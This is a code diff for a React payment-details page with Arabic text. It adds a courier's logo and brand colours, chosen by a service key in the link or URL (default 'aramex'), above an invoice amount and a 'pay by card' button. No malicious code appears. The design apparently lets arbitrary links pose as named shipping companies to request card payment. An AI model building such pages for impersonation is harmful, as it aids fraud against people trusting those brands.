@@ -6,6 +6,7 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
+import { getServiceBranding } from "@/lib/serviceLogos";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User } from "lucide-react";
 
 const PaymentDetails = () => {
@@ -16,6 +17,7 @@ const PaymentDetails = () => {
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
   const shippingInfo = linkData?.payload as any;
+  const branding = getServiceBranding(serviceKey);
 
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
@@ -64,10 +66,25 @@ const PaymentDetails = () => {
         <div
           className="relative w-full h-48 sm:h-64 overflow-hidden"
           style={{
-            background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
           }}
         >
           <div className="absolute inset-0 bg-black/30" />
+          
+          {/* Logo Overlay */}
+          {branding.logo && (
+            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
+              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
+                <img 
+                  src={branding.logo} 
+                  alt={serviceName}
+                  className="h-12 sm:h-16 w-auto"
+                  onError={(e) => e.currentTarget.style.display = 'none'}
+                />
+              </div>
+            </div>
+          )}
+          
           <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
             <div className="text-right">
               <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
@@ -78,14 +95,14 @@ const PaymentDetails = () => {
 
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
+            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
               <div className="flex items-center justify-between mb-6 sm:mb-8">
                 <h1 className="text-xl sm:text-3xl font-bold">تفاصيل الدفع</h1>
 
                 <div
                   className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                   style={{
-                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                   }}
                 >
                   <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
@@ -154,11 +171,11 @@ const PaymentDetails = () => {
                 <div
                   className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
                   style={{
-                    background: `linear-gradient(135deg, ${countryData?.primaryColor}15, ${countryData?.secondaryColor}15)`
+                    background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
                   }}
                 >
                   <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
-                  <span className="text-xl sm:text-2xl font-bold" style={{ color: countryData?.primaryColor }}>
+                  <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
                     {formattedAmount}
                   </span>
                 </div>
@@ -170,14 +187,14 @@ const PaymentDetails = () => {
                 <div
                   className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4 hover:shadow-md transition-shadow"
                   style={{
-                    borderColor: countryData?.primaryColor,
-                    background: `${countryData?.primaryColor}10`
+                    borderColor: branding.colors.primary,
+                    background: `${branding.colors.primary}10`
                   }}
                 >
                   <div className="flex items-center gap-2 sm:gap-3">
                     <div
                       className="w-10 h-10 rounded-full flex items-center justify-center"
-                      style={{ backgroundColor: countryData?.primaryColor }}
+                      style={{ backgroundColor: branding.colors.primary }}
                     >
                       <CreditCard className="w-5 h-5 text-white" />
                     </div>
@@ -193,12 +210,12 @@ const PaymentDetails = () => {
 
               {/* Security Badge */}
               <div className="mb-6 sm:mb-8">
-                <div className="flex items-center gap-3 p-4 bg-white rounded-lg border" style={{ borderColor: countryData?.secondaryColor }}>
+                <div className="flex items-center gap-3 p-4 bg-white rounded-lg border" style={{ borderColor: branding.colors.secondary }}>
                   <div
                     className="w-10 h-10 rounded-full flex items-center justify-center"
-                    style={{ backgroundColor: `${countryData?.secondaryColor}15` }}
+                    style={{ backgroundColor: `${branding.colors.secondary}15` }}
                   >
-                    <Shield className="w-5 h-5" style={{ color: countryData?.secondaryColor }} />
+                    <Shield className="w-5 h-5" style={{ color: branding.colors.secondary }} />
                   </div>
                   <div>
                     <p className="font-semibold text-sm sm:text-base">
@@ -217,7 +234,7 @@ const PaymentDetails = () => {
                 size="lg"
                 className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                 style={{
-                  background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
+                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                 }}
               >
                 <span className="ml-2">الدفع بالبطاقة</span>
